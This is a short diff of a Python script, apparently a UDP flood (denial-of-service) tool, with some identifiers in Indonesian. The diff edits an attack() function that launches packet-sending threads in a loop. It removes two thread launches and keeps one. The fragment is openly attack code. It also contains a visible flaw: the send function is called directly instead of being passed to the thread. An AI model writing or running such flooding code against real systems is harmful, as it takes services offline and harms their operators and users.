@@ -20,8 +20,6 @@ def kirim_paket(amplifier):
 def attack():
     if caranya == "UDP":
         for sequence in range(loops):
-            threading.Thread(target=kirim_paket(375), daemon=True).start()
             threading.Thread(target=kirim_paket(750), daemon=True).start()
-            threading.Thread(target=kirim_paket(1050), daemon=True).start()
 
 attack()
